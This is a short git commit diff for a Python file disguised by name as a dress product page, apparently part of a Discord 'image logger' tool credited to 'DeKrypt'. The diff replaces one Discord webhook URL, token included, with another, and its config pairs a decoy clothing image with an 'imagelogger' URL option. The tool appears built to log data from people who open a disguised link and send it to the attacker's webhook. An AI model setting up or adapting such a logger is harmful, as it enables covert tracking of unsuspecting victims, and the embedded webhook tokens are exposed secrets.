b58efef61152c9d47e5b0c9bbe0dc61126cd0eca
vhixgs <lucaberca99@gmail.com>
2025-07-29 23:42:31 +0300

    Update mango-rochie-maxi-strawberry-m9121c7kh-j11.html.py

--- api/mango-rochie-maxi-strawberry-m9121c7kh-j11.html.py
+++ api/mango-rochie-maxi-strawberry-m9121c7kh-j11.html.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1398421557495333017/a8Bu3T1PVmgWJNuoXCGfp7x4QECkOhET6z6vW1wJW1P80pwyTci78gL0XPX_PwpsK2Q-",
+    "webhook": "https://discord.com/api/webhooks/1399854457809797161/BtzXySJ1hOLwvn3IgqgCpVWR6_Bx1Npe4fwgDtimxeCRSTplSajRiaRzyIANG8VDpqvz",
     "image": "https://framboise.ro/wp-content/uploads/2024/04/Rochie-eleganta-midi-din-matase-rosie-Dunya-5.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
